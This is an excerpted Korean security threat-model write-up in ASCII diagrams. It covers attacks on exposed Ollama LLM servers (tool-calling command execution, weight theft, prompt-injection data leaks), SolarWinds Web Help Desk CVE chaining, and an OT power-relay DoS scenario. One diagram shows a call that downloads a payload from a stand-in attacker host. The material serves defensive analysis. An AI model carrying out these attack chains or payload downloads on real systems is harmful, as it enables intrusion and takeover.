...
인터넷 공격자           노출된 Ollama 서버            내부 리소스
     ...
     |                       |                         |
     | A. 무단 LLM 추론 (리소스 탈취)                  |
     | B. Tool-calling으로 시스템 명령 실행             |
     |       |-------------->|------------------------>|
     | C. Uncensored 모델로 악성 콘텐츠 생성           |
     | D. 모델 가중치 탈취 (/api/pull)                 |
     | E. 프롬프트 인젝션으로 데이터 유출              |
```
...
Function Execution
     ...
     ├── network_scan("192.168.0.0/24")
     └── download_payload("http://attacker.com/mal")
     |
     v
호스트 시스템 장악
```
...
```
SolarWinds Web Help Desk 취약점 공격 표면
=============================================
...
인터넷                WHD 서버                      내부 시스템
  ...
  | === 공격 체이닝 시나리오 ===                        |
  |                      |                              |
  | 1. CVE-40537 (하드코딩 자격증명) 접근 확보         |
  |    + CVE-40536 (보안 제어 우회) 권한 상승          |
  |    = 전체 시스템 장악                               |
  |                      |                              |
  | 2. CVE-40552 (인증 우회)                            |
  |    + CVE-40551 (역직렬화 RCE)                      |
...
[치명적 발견]                    [빈도]      [위험도]
====================================================================
미패치 PAC 장비                  매우 높음    🔴 Critical
(CVE-2015-5374: 보호 릴레이 DoS)

문서화되지 않은 TCP/IP 연결      50+ 건       🔴 Critical
(외부 주소로의 지속적 연결)

IT/OT 세그멘테이션 부재          매우 높음    🔴 Critical
(플랫 네트워크 구조)

미사용 프로토콜 활성화            높음        🟠 High
(NetBIOS, IPv6, 디버깅 기능)

미추적 IP 카메라/프린터           높음        🟠 High
(자산 관리 누락)
...
```
CVE-2015-5374 공격 시나리오
=============================

공격자                OT 네트워크              보호 릴레이        전력 시스템
  |                      |                        |                  |
  | 1. 네트워크 접근     |                        |                  |
  | (플랫 네트워크)      |                        |                  |
  |--------------------->|                        |                  |
